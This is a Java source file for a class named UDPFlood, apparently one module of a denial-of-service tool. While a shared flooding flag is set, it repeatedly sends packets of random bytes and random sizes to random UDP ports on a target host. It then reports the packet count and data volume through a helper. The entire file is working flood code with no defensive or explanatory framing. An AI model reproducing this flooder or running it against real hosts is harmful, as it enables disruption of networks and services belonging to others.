package syn.net;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

import syn.utils.Settings;
import syn.utils.Utilities;

public class UDPFlood extends Flood {

	private DatagramSocket socket;
	private DatagramPacket packet;
	private static int packetCount;
	private static double totalSize;
	
	public UDPFlood(String target) {
		super(target);
	}
	
	public void run() {
		try {
			Random rand = new Random();
			int udpPort = 0;
			byte[] bytes;
			socket = new DatagramSocket();
			
			while(Flood.isFlooding()) {
				try {
					int packetSize = (int)(Math.random() * (735 - 64)) + 64;
					udpPort = rand.nextInt(65536);
					bytes = new byte[packetSize];
					rand.nextBytes(bytes);
					packet = new DatagramPacket(bytes, bytes.length, InetAddress.getByName(super.getTarget()), udpPort);
					socket.send(packet);
					packetCount++;
					totalSize += ((packetSize / 1000.0) / 1000.0);
					if(Settings.debugMode) {
						//System.out.println("debug: sent packet " + packetSize + " at port " + udpPort);
					}
					Thread.sleep(5);
				} catch (Exception ex) {}
			}
			socket.close();
			if(!resultsSent) {
				resultsSent = true;
				Utilities uc = new Utilities();
				uc.write(packetCount + " packets sent, total of " + String.format("%.2f", totalSize) + "MB");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
